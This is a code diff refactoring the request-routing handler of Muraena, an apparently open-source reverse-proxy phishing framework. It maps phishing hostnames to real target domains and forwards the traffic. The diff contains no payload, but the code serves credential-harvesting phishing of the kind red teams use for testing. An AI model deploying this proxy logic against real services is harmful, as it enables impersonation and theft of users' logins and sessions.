@@ -13,9 +13,10 @@ import (
 
 	"github.com/evilsocket/islazy/tui"
 	. "github.com/logrusorgru/aurora"
+	"github.com/pkg/errors"
+
 	"github.com/muraenateam/muraena/core"
 	"github.com/muraenateam/muraena/module/necrobrowser"
-	"github.com/pkg/errors"
 
 	"github.com/muraenateam/muraena/core/db"
 	"github.com/muraenateam/muraena/log"
@@ -352,7 +353,6 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 			}
 		}
 
-
 	} else {
 		if len(response.Cookies()) > 0 {
 			log.Debug("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
@@ -458,14 +458,12 @@ func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
 	return muraena
 }
 
-func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Request) {
+func (st SessionType) HandleFood(response http.ResponseWriter, request *http.Request) {
 
 	var destination string
-	sess := st.Session
-	replacer := st.Replacer
 
-	if sess.Config.StaticServer.Enabled {
-		m, err := sess.Module("static.http")
+	if st.Session.Config.StaticServer.Enabled {
+		m, err := st.Session.Module("static.http")
 		if err != nil {
 			log.Error("%s", err)
 		}
@@ -477,33 +475,31 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 	}
 
 	if destination == "" {
-		if strings.HasPrefix(request.Host, replacer.ExternalOriginPrefix) { //external domain mapping
-			for domain, subMapping := range replacer.OriginsMapping {
+		if strings.HasPrefix(request.Host, st.Replacer.ExternalOriginPrefix) { //external domain mapping
 
+			for domain, subMapping := range st.Replacer.GetOrigins() {
 				// even if the resource is aa.bb.cc.dom.tld, the mapping is always one level as in www--2.phishing.tld.
-				// This is specifically important since wildcard SSL certs do not handle N levels of nesting
+				// This is important since wildcard SSL certs do not handle N levels of nesting
 				if subMapping == strings.Split(request.Host, ".")[0] {
-					destination = fmt.Sprintf("%s%s", sess.Config.Protocol,
+					destination = fmt.Sprintf("%s%s", st.Session.Config.Protocol,
 						strings.Replace(request.Host,
-							fmt.Sprintf("%s.%s", subMapping, replacer.Phishing),
+							fmt.Sprintf("%s.%s", subMapping, st.Replacer.Phishing),
 							domain, -1))
 					break
 				}
 			}
 		} else {
-			destination = fmt.Sprintf("%s%s", sess.Config.Protocol,
-				strings.Replace(request.Host, replacer.Phishing, replacer.Target, -1))
+			destination = fmt.Sprintf("%s%s", st.Session.Config.Protocol,
+				strings.Replace(request.Host, st.Replacer.Phishing, st.Replacer.Target, -1))
 		}
 	}
 
 	// PortMapping
-	if sess.Config.Proxy.PortMap != "" {
-
+	if st.Session.Config.Proxy.PortMap != "" {
 		destURL, err := url.Parse(destination)
 		if err != nil {
 			log.Error("%s", err)
 		} else {
-
 			port := destURL.Port()
 			if port == "" && destURL.Scheme == "https" {
 				port = "443"
@@ -513,8 +509,8 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 				destination = fmt.Sprintf("%s:%s", destination, port)
 			}
 
-			if strings.HasPrefix(sess.Config.Proxy.PortMap, fmt.Sprintf("%s:", port)) {
-				newport := strings.Split(sess.Config.Proxy.PortMap, ":")[1]
+			if strings.HasPrefix(st.Session.Config.Proxy.PortMap, fmt.Sprintf("%s:", port)) {
+				newport := strings.Split(st.Session.Config.Proxy.PortMap, ":")[1]
 				destination = strings.Replace(destination, fmt.Sprintf(":%s", port), fmt.Sprintf(":%s", newport), 1)
 			}
 		}
@@ -528,8 +524,8 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 	muraena := &MuraenaProxyInit{
 		Origin:   request.Host,
 		Target:   destination,
-		Session:  sess,
-		Replacer: replacer,
+		Session:  st.Session,
+		Replacer: st.Replacer,
 	}
 
 	muraenaProxy := muraena.Spawn()
